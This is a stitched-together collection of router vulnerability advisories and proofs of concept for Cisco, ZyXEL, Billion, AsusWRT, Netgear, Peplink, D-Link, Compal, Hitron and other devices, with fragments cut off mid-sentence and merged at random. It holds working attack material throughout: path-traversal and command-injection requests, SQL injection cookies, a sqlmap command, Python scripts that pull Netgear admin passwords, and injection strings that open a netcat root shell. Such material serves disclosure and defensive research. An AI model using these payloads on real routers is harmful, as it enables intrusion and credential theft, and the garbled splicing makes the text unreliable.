By sending the following GET request, You get direct access to the configuration file, which allows you to log in to the login panel:
GET /../../../../../../../../../../../../mnt/flash/params/j_admin_admin.params HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Content-Length: 121
{""enable"":true,""username"":""admin"",""password”:""xxx!"",""web_access"":0,""http_port"":80,""https_port"":443,""gui_timeout"":15}
In this case, the admin user is configured to have access to the shell (SSH Access) as can be seen in the /etc/passwd

## Vulnerability details
## Proof of Concept","The following advisory describes an arbitrary file disclosure vulnerability found in Cisco DPC3928AD DOCSIS 3.0 2-PORT Voice Gateway.
The Cisco DPC3928AD DOCSIS is a home wireless router that is currently ""Out of support"" but is provided by ISPs world wide.
An independent security researcher has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.
We reported the vulnerability to Cisco and they informed us that the Cisco DPC3928AD sold to Technicolor: “The Cisco DPC3928AD was actually sold to Technicolor a while back. In this case, we will ask you to please contact Technicolor at security@technicolor.com to open a case with them”
After connecting Technicolor, they informed us that the product has reached end of life and they will not patch the vulnerability: “After an extensive search for the product to perform validation, we were unable to source the gateway to validate your proof of concept. Due to the end-of-sale and end-of-life of the product Technicolor will not be patching the bug.”
CVE: CVE-2017-11502
Cisco DPC3928AD DOCSIS 3.0 2-PORT Voice Gateway vulnerability is present on its TCP/4321 port .
An attacker can get the /etc/passwd file from the remote device, by sending the following request:

#Technical Details & Description:
#Manual steps to reproduce the vulnerability :
#PoC: Exploitcode :","A cross-site request forgery web vulnerability has been discovered in the
official Netis-WF2419 Router.
The vulnerability allows remote attackers to manipulate client-side
web-application to browser requests to compromise the router
by execution of system specific functions without session protection.
A remote attacker is able to delete Address Reservation List settings of
Netis Router with a cross-site request forgery html script code.
The vulnerability can be exploited by loading embedded html code in a site
or page. The issue can also be exploited by attackers to external redirect
an user account
to malicious web pages.
The issue requires medium user interaction in case of exploitation. The
request method to execute is GET and the attack vector is located on the
client-side of the router firmware.
Exploitation of the cross site request forgery web vulnerability requires
no privilege web application user account and medium or high user
interaction.
Successful exploitation results in client-side account theft by client-side
phishing, client-side external redirects and non-persistent manipulation of
application functions that are in use.
The vulnerability can be exploited by remote attackers without privileged
application user account and with medium or high user interaction.
For security demonstration or to reproduce the vulnerability follow the
provided information and steps below to continue.
1. Logging Your Netis Router
1. Now inject or use the html code
2. When the user of the router opens the html code in site or other type of

>> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security
Disclosure: 26/12/2016 / Last updated: 18/01/2017
>> Summary:
TrueOnline is a major Internet Service Provider in Thailand which distributes various rebranded ZyXEL and Billion routers to its customers.
Three router models - ZyXEL P660HN-T1A v1, ZyXEL P660HN-T1A v2 and Billion 5200W-T - contain a number of default administrative accounts, as well as authenticated and unauthenticated command injection vulnerabilities (running as root) in their web interfaces, mostly in the syslog remote forwarding function. All the routers are still in widespread use in Thailand, with the Billion 5200W-T router currently being distributed to new customers.
These routers are based on the TC3162U SoC (or variants of it), a system-on-a-chip made by TrendChip, which was a manufacturer of SoC that was acquired by Ralink / MediaTek in 2011.
TC3162U based routers have two firmware variants.
The first variant is ""ras"", used on hardware versions that have 4mb or less of flash storage, which is based on the real time operating system ZynOS. It is infamous as the includes Allegro RomPager v4.07, which is vulnerable to the ""misfortune cookie"" attack (see [1]), and its web server is vulnerable to the ""rom-0"" attack (see [2]).
The other variant is ""tclinux"", which is a full fledged Linux used in hardware versions that have more than 4 MB of flash storage. This advisory refers to this variant, which includes the Boa web server and several ASP files with the command injection vulnerabilities. Note that tclinux might also be vulnerable to the misfortune cookie and rom-0 attacks - this was not investigated in detail by the author. For more information on tclinux see [3].
It should be noted that tclinux contains files and configuration settings in other languages (for example in Turkish). Therefore it is likely that these firmware versions are not specific to TrueOnline, and other ISP customised routers in other countries might also be vulnerable. It is also possible that other brands and router models that use the tclinux variant are also affected by the command injection vulnerabilities (while the default accounts are likely to be TrueOnline specific). Please contact pedrib@gmail.com if you find any other routers or firmware versions that have the same vulnerabilities.
These vulnerabilities were discovered in July 2016 and reported through Securiteam's Secure Disclosure program (see https://blogs.securiteam.com/index.php/archives/2910 for their advisory). SSD contacted the vendors involved, but received no reply and posted their advisory on December 26th 2016. There is currently no fix for these issues. It is unknown whether these issues are exploitable over the WAN, although this is a possibility since some of the default accounts appear to have been deployed for ISP use.
Three Metasploit modules that abuse these vulnerabilities have been released (see [4], [5] and [6]).
>> Update (18/01/2017):
ZyXEL have responded to this advisory and published information about upcoming fixes for the 660HN v1 and v2 in http://www.zyxel.com/support/announcement_unauthenticated.shtml
>> Technical details:
Vulnerability: Unauthenticated command injection (ZyXEL P660HN-T1A v1)
NO-CVE - use FD:2017/Jan/40-1 (Full Disclosure) or SSD-2910 (SecuriTeam blog)
Attack Vector: Remote
Constraints: Can be exploited by an unauthenticated attacker in the LAN. See below for other constraints.
Affected versions:
- ZyXEL P660HN-T1A, hardware revision v1, TrueOnline firmware version 340ULM0b31, other firmware versions might be affected
This router has a command injection vulnerability in the Maintenance > Logs > System Log > Remote System Log forwarding function.
The vulnerability is in the ViewLog.asp page, which is accessible unauthenticated. The following request will cause the router to issue 3 ping requests to 10.0.99.102:
POST /cgi-bin/ViewLog.asp HTTP/1.1
remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bping+-c+3+10.0.99.102%3b%23&remoteSubmit=Save
The command in injection is in the remote_host parameter.
This vulnerability was found during a black box assessment of the web interface, so the injection path was not fully investigated. All commands run as root.
Vulnerability: Authenticated command injection (ZyXEL P660HN-T1A v2)
NO-CVE - use FD:2017/Jan/40-2 (Full Disclosure) or SSD-2910 (SecuriTeam blog)
Attack Vector: Remote
Constraints: Can be exploited by an authenticated attacker in the LAN. See below for other constraints.
Affected versions:
- ZyXEL P660HN-T1A, hardware revision v2, TrueOnline firmware version 200AAJS3D0, other firmware versions might be affected
Unlike in the P660HN-Tv1, the injection is authenticated and in the logSet.asp page. However, this router contains several default administrative accounts (see below) that can be used to exploit this vulnerability.
The injection is in the logSet.asp page that sets up remote forwarding of syslog logs, and the parameter vulnerable to command injection is the serverIP parameter.
The following request will cause the router to issue 3 ping requests to 1.1.1.1:
POST /cgi-bin/pages/maintenance/logSetting/logSet.asp HTTP/1.1
logSetting_H=1&active=1&logMode=LocalAndRemote&serverIP=192.168.1.1`ping -c 3 1.1.1.1`%26%23&serverPort=514
This vulnerability was found during a black box assessment of the web interface, so the injection path was not fully investigated. All commands run as root.
It is known that this injection ends up in  /etc/syslog.conf as
ServerIP=""192.168.1.1 `ping -c 3 1.1.1.1`&#""
Which will then be executed by a background process almost immediately.
The actual injection is limited to 28 characters. This can circunvented by writing a shell script file in the /tmp directory 28 characters at a time, and the executing that file.
Vulnerability: Unauthenticated command injection (Billion 5200W-T)
NO-CVE - use FD:2017/Jan/40-3 (Full Disclosure) or SSD-2910 (SecuriTeam blog)
Attack Vector: Remote
Constraints: Can be exploited by an unauthenticated attacker in the LAN. See below for other constraints.
Affected versions:
- Billion 5200W-T, TrueOnline firmware version 1.02b.rc5.dt49, other firmware versions might be affected
The Billion 5200W-T router contains an unauthenticated command injection in adv_remotelog.asp page, which is used to set up remote syslog forwarding.
The following request will cause the router to issue 3 ping requests to 192.168.1.35:
POST /cgi-bin/adv_remotelog.asp HTTP/1.1
Host: 192.168.1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 85
RemotelogEnable=1&syslogServerAddr=1.1.1.1%3bping+-c+3+192.168.1.35%3b&serverPort=514
The injection is on the syslogServerAddr parameter and can be exploited by entering a valid IP address, followed by  "";<COMMAND>;""
This vulnerability was found during a black box assessment of the web interface, so the injection path was not fully investigated. All commands run as root.
Vulnerability: Authenticated command injection (Billion 5200W-T)
NO-CVE - use FD:2017/Jan/40-4 (Full Disclosure) or SSD-2910 (SecuriTeam blog)
Attack Vector: Remote
Constraints: Can be exploited by an authenticated attacker in the LAN. See below for other constraints.
Affected versions:
- Billion 5200W-T, TrueOnline firmware version TCLinux Fw $7.3.8.0 v008 130603, other firmware versions might be affected
The Billion 5200W-T router also has several other command injections in its interface, depending on the firmware version, such as an authenticated command injection in tools_time.asp (uiViewSNTPServer parameter).
It should be noted that this router contains several default administrative accounts that can be used to exploit this vulnerability.
This injection can be exploited with the following request:
POST /cgi-bin/tools_time.asp HTTP/1.1
Host: 192.168.1.1
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
Cookie: SESSIONID=7c082c75
SaveTime=1&uiCurrentTime2=&uiCurrentTime1=&ToolsTimeSetFlag=0&uiRadioValue=0&uiClearPCSyncFlag=0&uiwPCdateMonth=0&uiwPCdateDay=&uiwPCdateYear=&uiwPCdateHour=&uiwPCdateMinute=&uiwPCdateSec=&uiCurTime=N%2FA+%28NTP+server+is+connecting%29&uiTimezoneType=0&uiViewSyncWith=0&uiPCdateMonth=1&uiPCdateDay=&uiPCdateYear=&uiPCdateHour=&uiPCdateMinute=&uiPCdateSec=&uiViewdateToolsTZ=GMT%2B07%3A00&uiViewdateDS=Disable&uiViewSNTPServer=""%3b+ping+-c+20+192.168.0.1+%26%23&ntp2ServerFlag=N%2FA&ntp3ServerFlag=N%2FA
This writes the command to a file /etc/ntp.sh:
/userfs/bin/ntpclient -s -c 3 -l -h """"; ping -c 20 192.168.0.1 &#"" &
which is then executed almost immediately.
This vulnerability was found during a black box assessment of the web interface, so the injection path was not fully investigated. All commands run as root.
Vulnerability: Default administrative credentials (ZyXEL P660HN-T1A v1)
NO-CVE - use FD:2017/Jan/40-5 (Full Disclosure) or SSD-2910 (SecuriTeam blog)
Attack Vector: Remote

>> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security
Disclosure: 22/01/2018 / Last updated: 25/01/2018
>> Background and summary
AsusWRT is the operating system used in mid range and high end Asus routers. It is based on Linux, but with a sleek web UI and a slimmed down profile suitable for running on resource constrained routers.
Thankfully ASUS is a responsible company, and not only they publish the full source code as required by the GPL, but they also give users full root access to their router via SSH. Overall the security of their operating system is pretty good, especially when compared to other router manufacturers.
However due to a number of coding errors, it is possible for an unauthenticated attacker in the LAN to achieve remote code execution in the router as the root user.
A special thanks to Beyond Security SecuriTeam Secure Disclosure (SSD) programme for disclosing these vulnerabilities to the manufacturer, speeding the resolution of the issues discovered (see [1] for their advisory).
>> Technical details:
Vulnerability: HTTP server authentication bypass
CVE-2018-5999
Attack Vector: Remote
Constraints: None; exploitable by an unauthenticated attacker
Affected versions: confirmed on v3.0.0.4.380.7743; possibly affects every version before v3.0.0.4.384.10007
The AsusWRT HTTP server has a flaw in handle_request() that allows an unauthenticated user to perform a POST request for certain actions.
In AsusWRT_source/router/httpd/httpd.c:
handle_request(void)
handler->auth(auth_userid, auth_passwd, auth_realm);
auth_result = auth_check(auth_realm, authorization, url, file, cookies, fromapp);
if (auth_result != 0)                                     <--- auth fails
if(strcasecmp(method, ""post"") == 0){
if (handler->input) {
handler->input(file, conn_fp, cl, boundary);        <--- but POST request is still processed
send_login_page(fromapp, auth_result, NULL, NULL, 0);
return;
This can (and will) be combined with other vulnerabilities to achieve remote code execution.
Vulnerability: Unauthorised configuration change (NVRAM value setting)
CVE-2018-6000
Attack Vector: Remote
Constraints: None; exploitable by an unauthenticated attacker
Affected versions: confirmed on v3.0.0.4.380.7743; possibly affects every version before v3.0.0.4.384.10007
By abusing vulnerability #1 and POSTing to vpnupload.cgi, we can invoke do_vpnupload_post() in the HTTP server code, which has a vulnerability that allows an attacker to set NVRAM configuration values directly from the request.
In AsusWRT_source/router/httpd/web.c:
do_vpnupload_post(char *url, FILE *stream, int len, char *boundary)
if (!strncasecmp(post_buf, ""Content-Disposition:"", 20)) {
if(strstr(post_buf, ""name=\""file\""""))
break;
else if(strstr(post_buf, ""name=\"""")) {
offset = strlen(post_buf);
fgets(post_buf+offset, MIN(len + 1, sizeof(post_buf)-offset), stream);
len -= strlen(post_buf) - offset;
offset = strlen(post_buf);
fgets(post_buf+offset, MIN(len + 1, sizeof(post_buf)-offset), stream);
len -= strlen(post_buf) - offset;
p = post_buf;
name = strstr(p, ""\"""") + 1;
p = strstr(name, ""\"""");
strcpy(p++, ""\0"");
value = strstr(p, ""\r\n\r\n"") + 4;
p = strstr(value, ""\r"");
strcpy(p, ""\0"");
nvram_set(name, value);
These NVRAM values contain very important configuration variables, such as the admin password, which can be set in this way by an authenticated or unauthenticated attacker.
Once that is done, code execution is easily achieved. One option is to login to the web interface with the new password, enable SSH, reboot the router and login via SSH.
A more elegant option is to abuse infosvr, which is a UDP daemon running on port 9999.
The daemon has a special mode where it executes a command received in a packet as the root user. This special mode is only enabled if ateCommand_flag is set to 1, which most likely only happens during factory testing or QA (it was not enabled by default in the firmware distributed by Asus in their website).
However we can set ateCommand_flag to 1 using the VPN configuration upload technique described above and then send a PKT_SYSCMD to infosvr. The daemon will read a command from the packet and execute it as root, achieving our command execution cleanly - without changing any passwords.
(Note: infosvr used to allow unauthenticated command execution without the ateCommand_flag being set, which led to Joshua Drake's (jduck) discovery of CVE-2014-9583, see [2]; this was fixed by Asus in early 2015).
Packet structure (from AsusWRT_source/router/shared/iboxcom.h):
- Header
typedef struct iboxPKTEx
BYTEServiceID;
BYTEPacketType;
WORDOpCode;
DWORD Info; // Or Transaction ID
BYTEMacAddress[6];
BYTEPassword[32];   //NULL terminated string, string length:1~31, cannot be NULL string
} ibox_comm_pkt_hdr_ex;
- Body
typedef struct iboxPKTCmd
WORDlen;
BYTEcmd[420];<--- command goes here
} PKT_SYSCMD;// total 422 bytes
A Metasploit module exploiting this vulnerability has been released [3].
>> Fix:
Upgrade to AsusWRT v3.0.0.4.384.10007 or above.

iBall ADSL2+ Home Router does not properly authenticate when pages are accessed through cgi version. This could potentially allow a remote attacker access sensitive information and perform actions such as reset router, downloading backup configuration, upload backup etc.
How to reproduce
Suppose 192.168.1.1 is the router IP and one of the valid page in router is is  http://192.168.1.1/abcd.html, then the page can be directly accessed as as http://192.168.1.1/abcd.cgi
Example URLs:
* http://192.168.1.1/info.cgi – Status and details
* http://192.168.1.1/upload.cgi – Firmware Upgrade
* http://192.168.1.1/backupsettings.cgi – perform backup settings to PC
* http://192.168.1.1/pppoe.cgi – PPPoE settings
* http://192.168.1.1/resetrouter.cgi – Router reset
* http://192.168.1.1/password.cgi – password settings

Abstract:
iball Baton 150M Router's login page is insecurely developed that any
attacker could bypass the admin's authentication just by tweaking the
password.cgi file.
Affected Version:
Firmware Version : 1.2.6 build 110401 Rel.47776n
Hardware Version : iB-WRA150N v1 00000001
Exploitation-Technique:
Remote
Severity Rating:
9
Details:
Any attacker can escalate his privilege to admin using this vulnerability.
Proof Of Concept:
1) Navigate to Routers Login page which is usually IPV4 default Gateway IP,
i.e 172.20.174.1
2) Now just append password.cgi to the URL i.e
3) Right-click and View Source code which disclsus the username, password
and user role of the admin in the comment section
4) Successfully logged in using the disclosed credentials.

Summary and Impact
Several issues have been identified, which allow attackers to access the
administrative web interface with admin credentials, delete files,
perform CSRF and XSS attacks.
Product Description
From the vendor webpage:
Use Load Balancing and SpeedFusion bandwidth bonding to deliver
superfast VoIP, video streaming, and data using an SD-WAN enabled
network. Even with a basic Balance 20 dual-WAN router, you can mix
different transport technologies and providers to keep your network up
when individual links go down. Switching between links is automatic and
seamless.
SQL Injection via bauth Cookie
Severity Rating: Critical
Vector: Network
CVE: CVE-2017-8835
CWE: 89
CVSS Score: 9.8
CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Summary and Impact
Peplink devices are vulnerable to an SQL injection attack via the bauth
cookie parameter which is set e.g. when accessing
The injection can be checked with the following command:
./sqlmap.py -u ""https://ip/cgi-bin/MANGA/admin.cgi""
--cookie=""bauth=csOWLxU4BvoMfhY2rHLVFm1EmZWV74zinla9IVclqrYxH16426647""
-p""bauth"" --level 5 --risk 3 --dbms sqlite --technique=BEUSQ
--flush-session -t trace.log --prefix ""'"" --suffix ""--"" -a
The vulnerability in the Peplink device allows to access the SQLite
session database containing user and session variables. By using the the
following cookie in a web request, it is possible to select a running
administrator session to be used for the attackers login.
bauth=-12' or id IN (select s.id from sessions as s left join
sessionsvariables as v on v.id=s.id where v.name='rwa' and v.value='1')
or '1'='2
By forming specialised SQL queries, it is possible to retrieve usernames
from the database. This worked by returning a valid session in case the
username existed and no session if it did not exist. In the first case
the server did not set a new session cookie in the response to the request.
SELECT id FROM sessions WHERE sessionid = '-14' or id IN (select s.id
from sessions as s left join sessionsvariables as v on v.id=s.id where
v.name='username' and substr(v.value,1,3)='adm')
Workarounds
Install vendor supplied update.

Summary and Impact
The CGI scripts in the administrative interface are not protected
against cross site request forgery attacks. This allows an attacker to
execute commands, if a logged in user visits a malicious website. This
can for example be used to change the credentials of the administrative
webinterface.
Workarounds
Install vendor supplied update.

CWE: 80
CVSS Score: 5.4
CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N
Summary and Impact
If the webinterface is accessible, it is possible to abuse the the
orig_url parameter to trigger a cross-site-scripting issue in
/guest/preview.cgi. The injection is directly into existing JavaScript.
This executes the JavaScript in the victims browser, which can be abused

CWE: 73
CVSS Score: 6.5
CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:H
Summary and Impact
A logged in user can delete arbitrary files on the Peplink devices, by
abusing the /cgi-bin/MANGA/firmware_process.cgi. When an absolute path
is provided to the upfile.path parameter the file provided in the path
is deleted during the process. This can be abused to cause a denial of
service (DoS). In combination with the missing CSRF protection, this can
be abused remotely via a logged in user.
Workarounds

Make a Hotspot using any device. In Hotspot's Accss point name field, Put your malicious javascript code as a name of you hotspot.
When Target Router's monitors routers around. your Malicious hotspot named router log in target's Site survey page and your hotspot javascript code executed as a javascript.(make sure doing this you whitin a target's network range.)

Reference:
Credit:
Name: Indrajith.A.N
Website: https://www.indrajithan.com
Date:
13-03-2017
Vendor:
DIGISOL router is a product of Smartlink Network Systems Ltd. is one of India's leading networking company. It was established in the year 1993 to prop the Indian market in the field of Network Infrastructure.
Product:
DIGISOL DG-HR1400 is a wireless Router
Product link: http://wifi.digisol.com/datasheets/DG-HR1400.pdf
Abstract details:
privilege escalation vulnerability in the DIGISOL DG-HR1400 wireless router enables an attacker escalate his user privilege to an admin just by modifying the Base64encoded session cookie value
Affected Version:
<=1.00.02
Exploitation-Technique:
Remote
Severity Rating:
8
Proof Of Concept :
1) Login to the router as a User where router sets the session cookie value to VVNFUg== (Base64 encode of ""USER"")
2) So Encode ""ADMIN"" to base64 and force set the session cookie value to QURNSU4=
3) Refresh the page and you are able to escalate your USER privileges to ADMIN.

Description:
https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-5995
https://www.kb.cert.org/vuls/id/630872","The router (AP) is using very poor authentication mechanism . It uses a
static cookie to verify the incoming authentication. After careful
inspection it was found that the cookie used were same for any number of
authentication by the Admin .
Thus the cookie can be easily forged and the admin account could be
compromised without supplying the credentials .
Proof Of Concept:
Inject the following cookie in the browser with the given values :
admin:language : en
Reload the page . You are logged into the admin account .
Video POC : https://www.youtube.com/watch?v=dvF-7KK0g6E
Mitigation :
Use: a secure authentication mechanism consisting of random , complex
cookies .

Multiple Vulnerabilities in NETGEAR Routers
Published: 01/30/2017
Version: 1.0
Vendor: NETGEAR (http://www.netgear.com/)
Product: Multiple products

CVE: CVE-2017-5521

Product description:
Multiple Netgear Routers
Many Netgear routers are prone to password disclosure via simple crafted
requests to the web management server. The bug is exploitable remotely if the
remote management option is set and can also be exploited given access to the
router over LAN or WLAN.
When trying to access the web panel a user is asked to authenticate, if the
authentication is cancelled and password recovery is not enabled, the user is
redirected to a page which exposes a password recovery token. If a user
supplies the correct token to the page
enabled), they will receive the admin password for the router.
If password recovery is set the exploit will fail, as it will ask the user for the recovery
questions which were previously set when enabling the feature, this is
persistent, even after disabling the recovery option the exploit will fail,
because the router will ask for the security questions.
This can easily be reproduced using the attached poc, or by sending these two
simple requests via the browser:
1. http://router/.../ will redirect you to http://router/..../unauth.cgi?id=TOKEN to acquire the token
2. http://router/passwordrecovered.cgi?id=TOKEN will give you credentials (some models require you to send a post request instead of get)
import sys
import requests
def scrape(text, start_trig, end_trig):
if text.find(start_trig) != -1:

r = requests.get(url, verify=False)
model = r.headers.get('WWW-Authenticate')
if model is not None:
print ""Attcking: "" + model[13:-1]
else:
print ""not a netgear router""
sys.exit(0)
token = scrape(r.text, 'unauth.cgi?id=', '\""')
if token == 'i_dont_speak_english':
print ""not vulnerable""
sys.exit(0)
print ""token found: "" + token
url = url + 'passwordrecovered.cgi?id=' + token
r = requests.post(url, verify=False)
if r.text.find('left\"">') != -1:
username = (repr(scrape(r.text, 'Router Admin Username</td>', '</td>')))
username = scrape(username, '>', '\'')
password = (repr(scrape(r.text, 'Router Admin Password</td>', '</td>')))
password = scrape(password, '>', '\'')
if username == ""i_dont_speak_english"":
username = (scrape(r.text[r.text.find('left\"">'):-1], 'left\"">', '</td>'))

sys.exit(0)
password = password.replace(""&#35;"",""#"")
password = password.replace(""&"",""&"")
print ""user: "" + username

Just run the PoC against a router to get the credentials if it is vulnerable.
Finding 2: Remote and Local Password Disclosure
Credit: Simon Kenin of Trustwave SpiderLabs
CVE: CVE-2017-5521
Version affected:
Many Netgear routers are prone to password disclosure via simple crafted
request to the web management server. The bug is exploitable remotely if the
remote management option is set and can also be exploited given access to the
router over LAN or WLAN.
Netgear routers have an option to restore forgotten password via 2 security
questions. If the recovery option is disabled (which is the default), it is
still possible to recover the password by sending a correct token to the
recovery page.
If a user supplies the correct token to the page
enabled), they will receive the admin password for the router. If password
recovery is set the exploit will fail, as it will ask the user for the recovery
questions which were previously set when enabling the feature, this is
persistent, even after disabling the recovery option, the exploit will fail,
because the router will ask for the security questions.
This mechanism does not work correctly on the very first request to
""passwordrecovered.cgi"" and the token is not properly checked, this means that
any TOKEN value will result in disclosure of the password.
The issue occurs after every reboot of the router.
This can easily be reproduced using the attached poc, or by sending a simple
request via the browser:
1. http://router/passwordrecovered.cgi?id=Trustwave_SpiderLabs will give you credentials (some models require you to send a post request instead of get)
import sys
import requests
def scrape(text, start_trig, end_trig):
if text.find(start_trig) != -1:
return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]
else:
return ""i_dont_speak_english""
requests.packages.urllib3.disable_warnings()
ip = sys.argv[1]
port = sys.argv[2]
url = 'http://' + ip + ':' + port + '/'
try:
r = requests.get(url)
except:
url = 'https://' + ip + ':' + port + '/'
r = requests.get(url, verify=False)
model = r.headers.get('WWW-Authenticate')
if model is not None:
print ""Attcking: "" + model[13:-1]
else:
print ""not a netgear router""
sys.exit(0)
url = url + 'passwordrecovered.cgi?id=get_rekt'
try:
r = requests.post(url, verify=False)
except:
print ""not vulnerable router""
sys.exit(0)
if r.text.find('left\"">') != -1:
username = (repr(scrape(r.text, 'Router Admin Username</td>', '</td>')))
username = scrape(username, '>', '\'')
password = (repr(scrape(r.text, 'Router Admin Password</td>', '</td>')))
password = scrape(password, '>', '\'')
if username == ""i_dont_speak_english"":
username = (scrape(r.text[r.text.find('left\"">'):-1], 'left\"">', '</td>'))
password = (scrape(r.text[r.text.rfind('left\"">'):-1], 'left\"">', '</td>'))
else:
print ""not vulnerable router, or some one else already accessed passwordrecovered.cgi, reboot router and test again""
sys.exit(0)
password = password.replace(""&#35;"",""#"")
password = password.replace(""&"",""&"")
print ""user: "" + username
print ""pass: "" + password
Just run the PoC against a router to get the credentials if it is vulnerable.
Remediation Steps:
Please see NETGEAR's KBA for list of firmware patches for various models. As a
workaround, the bug only works when password recovery is NOT set. If you do set
password recovery this is not exploitable.

#  perform malicious activities like:
#    o  Steering unknowing users to bad sites:
#       These sites can be phishing pages that
#       spoof well-known sites in order to
#       trick users into handing out sensitive
#       information.
#    o  Replacing ads on legitimate sites:
#       Visiting certain sites can serve users

#       not infected.
#    o  Controlling and redirecting network traffic:

'Name'           => 'Dlink DIR Routers Unauthenticated HNAP Login Stack Buffer Overflow',
'Description'    => %q{
Several Dlink routers contain a pre-authentication stack buffer overflow vulnerability, which
is exposed on the LAN interface on port 80. This vulnerability affects the HNAP SOAP protocol,
which accepts arbitrarily long strings into certain XML parameters and then copies them into
the stack.
This exploit has been tested on the real devices DIR-818LW and 868L (rev. B), and it was tested
using emulation on the DIR-822, 823, 880, 885, 890 and 895. Others might be affected, and
this vulnerability is present in both MIPS and ARM devices.
The MIPS devices are powered by Lextra RLX processors, which are crippled MIPS cores lacking a
few load and store instructions. Because of this the payloads have to be sent unencoded, which
can cause them to fail, although the bind shell seems to work well.
For the ARM devices, the inline reverse tcp seems to work best.
Check the reference links to see the vulnerable firmware versions.

# Date : 06/10/2016
# Author : R-73eN
# Tested on: Billion Router 7700NR4
# Vendor : http://www.billion.com/
# Vulnerability Description:
# This router is a widely used here in Albania. It is given by a telecom provider to the home and bussiness users.
# The problem is that this router has hardcoded credentials which ""can not be changed"" by a normal user. Using these
# credentials we don't have to much access but the lack of authentication security we can download the backup and get the admin password.
# Using that password we can login to telnet server and use a shell escape to get a reverse root connection.
# You must change host with the target and reverse_ip with your attacking ip.
# Fix:
# The only fix is hacking your router with this exploit, changing the credentials and disabling all the other services using iptables.

The following vulnerabilities are the result of a quick check (~3 hours)
of the Mercury modem. We performed a systematic and deeper evaluation of
this device also, which result will be described in a separate report [2] and advisory.
Platforms / Firmware confirmed affected:
- Compal CH7465LG-LC, CH7465LG-NCIP-4.50.18.13-NOSH
Vulnerabilities
Insecure session management
The web interface uses cookies, but is not verified. Thus, if admin
login is successful, the IP address and the browser type of the admin
user are stored and everybody can access the management interface with
the same IP and the same user-agent.
Information leakage
Some information requests can be performed without authentication. For
example an attacker can obtain the following information pieces:
-    Global settings (SW version, vendor name, etc.)
-    CSRF token
-    Event log
-    LAN user table
-    Ping response
Unauthenticated deny of service attack
Factory reset can be initiated without authentication with a simple POST
request to the getter.xml.
Unauthenticated configuration changes
Some settings modification can be performed without authentication, for
example the first install flag and the ping command.
Unauthenticated command injection
The ping diagnostic function is vulnerable to system command injection,
because parameters are checked only at the client side. Using the
following ping target, the attacker can gain local root access to the
device:
“token=<csrf_token>&fun=126&Type=0&Target_IP=127.0.0.1&Ping_Size=64;nc
-l -p 1337 -e /bin/sh;&Num_Ping=3&Ping_Interval=1”
Timeline
- 2015.10.21: SEARCH-LAB received two sample boxes from the Compal Mercury devices from UPC Magyarorszag
- 2015.10.21: Within three hours we reported a remotely exploitable vulnerability on the device
- 2015.10.21: Liberty Global asked for a commercial proposal on executing an overall security evaluation of the Compal device.
- 2015.10.24: A proposal was sent to Liberty Global.
- 2015.11.09: Liberty Global asked to execute the evaluation as a pilot project without financial compensation.
- 2015.12.07: End Use Certificate for Dual-Use Items was asked from Liberty Global as the developer of the device is located in China.
- 2016.01.07: The 99-page-long Evaluation Report on Compal Mercury modem was sent to Liberty Global with the restriction that they are not allowed to forward it outside of the European Union until a signed End Use Certificate is received.
- 2016.01.07: First reaction to the report said: “Bloody hell, that is not a small document ;)”
- 2016.01.11: Liberty Global sent the signed End Use Certificate for Dual-Use Items to SEARCH-LAB
- 2016.01.27: UPC Magyarorszag send out a repeated warning to its end users about the importance of the change of the default passphrases.
- 2016.02.16: Face to face meeting with Liberty Global security personnel in Amsterdam headquarters
- 2016.02.18: A proposal was sent to Liberty Global suggesting a wardriving experiment in Budapest, Hungary to measure the rate of end users who are still using the default passphrases.
Recommendations
We do not know about any possible solution. Firmware update should install the ISP after the fix will be ready.

Platforms / Firmware confirmed affected:
- Hitron CGNV4, 4.3.9.9-SIP-UPC
- Product page: http://www.hitrontech.com/en/cable_detail.php?id=62
Vulnerabilities
Insecure session management
The web interface uses insecure cookies, which can be brute-forced
easily (e.g cookie: userid=0). If admin login is successful, the IP
address of the admin user is stored and everybody can access the
management interface with the same IP.
Missing CSRF protection
The web interface is not used any CSRF protection. In case of a valid
session exists, the attacker can modify any settings of the router. If
the default admin password was not changed, the attacker can perform a
login also and modify any settings after it.
Authenticated command injection
The ping diagnostic function is vulnerable to system command injection,
because the parameters are checked only at the client side. Using the
following ping target, the attacker can gain local root access to the
device:
“google.com;nc -l -p 1337 -e /bin/sh;echo”.
Disclaimer
We found these vulnerabilities within a very short time range (3 hours),
and we did not check a lot of areas such as:
- Command injections in other modules
- Buffer overflows

- Product page: http://www.technicolor.com/en/solutions-services/connected-home/broadband-devices/cable-modems-gateways/tc7200-tc7300
Vulnerabilities
Insecure session management
The web interface does not use cookies at all and does not check the IP
address of the client. If admin login is successful, every user from the
LAN can access the management interface.
Backup file encryption uses fix password
Technicolor fixed the CVE-2014-1677 by encrypting the backup file with
AES. However, the encrypted backup file remains accessible without
authentication and if the password is not set in the web interface a
default password is used. So, if an attacker accesses the backup file
without authentication, the password cannot be set, and the backup file
can be decrypted.
Timeline

Platforms / Firmware confirmed affected:
- Ubee EVW3226, 1.0.20
- Product page: http://www.ubeeinteractive.com/products/cable/evw3226
Vulnerabilities
Insecure session management
The web interface does not use cookies at all. If admin login is
successful, the IP address of the admin user is stored and everybody can
access the management interface with the same IP.
Local file inclusion
Setup.cgi can read any file with .htm extension using directory
traversal in the gonext parameter. Although the file must have htm
extension, the local file inclusion can be used to map directories,
because the response is different depending on whether directory exists
or not.
POC:
Backup file is not encrypted
Although the web interface requires a password for encrypting the backup
file, the encryption is not performed. In order to backup file password,
the plain password is stored in the backup file, which is a standard tgz
(gzipped tar) file with a simple header.
Backup file disclosure
When a user requests a backup file, the file is copied into www root in
order to make download possible. However, the backup file is not removed
from the www root after download. Since there is not any session check
required to download the backup file, an attacker is able to download it
